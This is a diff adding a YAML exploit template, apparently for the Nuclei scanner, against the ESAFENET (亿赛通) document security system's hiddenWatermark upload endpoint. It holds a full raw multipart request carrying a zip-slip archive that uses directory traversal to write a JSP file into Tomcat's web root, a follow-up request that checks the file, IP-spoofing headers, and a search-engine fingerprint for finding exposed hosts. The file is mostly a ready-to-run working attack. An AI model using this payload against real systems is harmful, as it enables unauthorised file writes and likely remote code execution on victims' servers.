@@ -1,0 +1,40 @@
+id: poc-6b6cab064bb8f5be8273
+info:
+  name: 亿赛通电子文档安全管理系统hiddenWatermark任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/6b6cab064bb8f5be8273fe3b07d9f5fb
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 6b6cab064bb8f5be8273fe3b07d9f5fb
+    fofa: + hunter`app.name="ESAFENET 亿赛通文档安全管理系统"`
+http:
+- raw:
+  - "POST /CDGServer3/hiddenWatermark/uploadFile HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/120.0.0.0 Safari/537.36\nContent-Length: 2190\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\nConnection: close\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary3lm0J8uEuFHxy191\nOrigin: null\nX-Forwarded-For: 127.0.0.1\nX-Originating-Ip: 127.0.0.1\nX-Remote-Addr: 127.0.0.1\nX-Remote-Ip: 127.0.0.1\n\n------WebKitFormBoundary3lm0J8uEuFHxy191\nContent-Disposition: form-data; name=\"doc\"; filename=\"jskdjks.zip\"\nContent-Type: application/zip\n\nPK\x03\x04\x14\0\0\0\0\0{L9X\0\0\0\0\0\0\0\0\0\0\0\0\x03\0\0\0../PK\x03\x04\x14\0\0\0\0\0{L9X\0\0\0\0\0\0\0\0\0\0\0\0\x06\0\0\0../../PK\x03\x04\x14\0\0\0\0\0{L9X\0\0\0\0\0\0\0\0\0\0\0\0\t\0\0\0../../../PK\x03\x04\x14\0\0\0\0\0{L9X\0\0\0\0\0\0\0\0\0\0\0\0\n\0\0\0../../../../PK\x03\x04\x14\0\0\0\0\0{L9X\0\0\0\0\0\0\0\0\0\0\0\0\x0F\0\0\0../../../../../PK\x03\x04\x14\0\0\0\0\0{L9X\0\0\0\0\0\0\0\0\0\0\0\0\x16\0\0\0../../../../../tomcat/PK\x03\x04\x14\0\0\0\0\0{L9X\0\0\0\0\0\0\0\0\0\0\0\0\n\0\0\0../../../../../tomcat/webapps/PK\x03\x04\x14\0\0\0\0\0{L9X\0\0\0\0\0\0\0\0\0\0\0\0#\0\0\0../../../../../tomcat/webapps/ROOT/PK\x03\x04\x14\0\0\0\0\0tL9X\0\0\0\0\0\0\0\0\0\0\0\0\n\0\0\0theme/theme/PK\x03\x04\x14\0\0\0\0\0XL9X\0\0\0\0\0\0\0\0\0\0\0\0\x06\0\0\0theme/PK\x03\x04\x14\0\0\0\0gL9X_l�lS\0\0\0h\0\0\0\x16\0\0\0theme/theme/theme1.xml=�1\n�0\n����f���S\x11\\\\�\x03t�P0\"M&Ż[�:���u\x15�;aH+M�\tZ\x10\x11�\n�t<�/��(;�\n�2mj�\x16c��&�s\x03�C�oPK\x03\x04\x14\0\0\0\nL9X\0\0\0\0\0\0\0\0\0\0\0\0/\0\0\0../../../../../tomcat/webapps/ROOT/uuidc251.jsp\n�M\x0E�@\n\x06Ы�!��h����dM�\x04�|њff\n\n\\ߟ�{�*-ιht��mN�n��͡�>b۽d\x15�ă\x1A��lz\x17�\x14�\x01�Bl\x14\x7F�����\x7FwCY\n�o\"�\t_!P_]>PK\a�\n�\ed\0\0\0j\0\0\0PK\x01\x02?\0\x14\0\0\0\0\0{L9X\0\0\0\0\0\0\0\0\0\0\0\0\x03\0$\0\0\0\0\0\0\0\x10\0\0\0\0\0\0\0../\n\0 \0\0\0\0\0\x01\0\x18\0 4w�.O�\x01\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0PK\x01\x02?\0\x14\0\0\0\0\0{L9X\0\0\0\0\0\0\0\0\0\0\0\0\x06\0$\0\0\0\0\0\0\0\x10\0\0\0!\0\0\0../../\n\0 \0\0\0\0\0\x01\0\x18\0 4w�.O�\x01\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0PK\x01\x02?\0\x14\0\0\0\0\0{L9X\0\0\0\0\0\0\0\0\0\0\0\0\t\0$\0\0\0\0\0\0\0\x10\0\0\0E\0\0\0../../../\n\0 \0\0\0\0\0\x01\0\x18\0 4w�.O�\x01\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0PK\x01\x02?\0\x14\0\0\0\0\0{L9X\0\0\0\0\0\0\0\0\0\0\0\0\n\0$\0\0\0\0\0\0\0\x10\0\0\0l\0\0\0../../../../\n\0 \0\0\0\0\0\x01\0\x18\0 4w�.O�\x01\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0PK\x01\x02?\0\x14\0\0\0\0\0{L9X\0\0\0\0\0\0\0\0\0\0\0\0\x0F\0$\0\0\0\0\0\0\0\x10\0\0\0�\0\0\0../../../../../\n\0 \0\0\0\0\0\x01\0\x18\0 4w�.O�\x01\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0PK\x01\x02?\0\x14\0\0\0\0\0{L9X\0\0\0\0\0\0\0\0\0\0\0\0\x16\0$\0\0\0\0\0\0\0\x10\0\0\0�\0\0\0../../../../../tomcat/\n\0 \0\0\0\0\0\x01\0\x18\0 4w�.O�\x01\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0PK\x01\x02?\0\x14\0\0\0\0\0{L9X\0\0\0\0\0\0\0\0\0\0\0\0\n\0$\0\0\0\0\0\0\0\x10\0\0\0�\0\0\0../../../../../tomcat/webapps/\n\0 \0\0\0\0\0\x01\0\x18\0 4w�.O�\x01\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0PK\x01\x02?\0\x14\0\0\0\0\0{L9X\0\0\0\0\0\0\0\0\0\0\0\0#\0$\0\0\0\0\0\0\0\x10\0\0\03\x01\0\0../../../../../tomcat/webapps/ROOT/\n\0 \0\0\0\0\0\x01\0\x18\0 4w�.O�\x01\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0PK\x01\x02?\0\x14\0\0\0\0\0tL9X\0\0\0\0\0\0\0\0\0\0\0\0\n\0$\0\0\0\0\0\0\0\x10\0\0\0t\x01\0\0theme/theme/\n\0 \0\0\0\0\0\x01\0\x18\0A\n��.O�\x01\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0PK\x01\x02?\0\x14\0\0\0\0\0XL9X\0\0\0\0\0\0\0\0\0\0\0\0\x06\0$\0\0\0\0\0\0\0\x10\0\0\0�\x01\0\0theme/\n\0 \0\0\0\0\0\x01\0\x18\0�\x0Fî.O�\x01\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0PK\x01\x02?\0\x14\0\0\0\0gL9X_l�lS\0\0\0h\0\0\0\x16\0$\0\0\0\0\0\0\0 \0\0\0�\x01\0\0theme/theme/theme1.xml\n\0 \0\0\0\0\0\x01\0\x18\0��z�.O�\x01\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0PK\x01\x02\x14\0\x14\0\0\0\nL9X�\n�\ed\0\0\0j\0\0\0/\0$\0\0\0\0\0\0\0\0\0\0\0I\x02\0\0../../../../../tomcat/webapps/ROOT/uuidc251.jsp\n\0 \0\0\0\0\0\x01\0\x18\0\01 Z.O�\x01\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0PK\x05\x06\0\0\0\0\n\0\n\0�\x04\0\0\n\x03\0\0\0\0\n------WebKitFormBoundary3lm0J8uEuFHxy191--"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /uuidc251.jsp HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/120.0.0.0 Safari/537.36
+
+    Connection: close
+
+    Cache-Control: max-age=0
+
+    Upgrade-Insecure-Requests: 1
+
+    Accept-Encoding: gzip, deflate'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
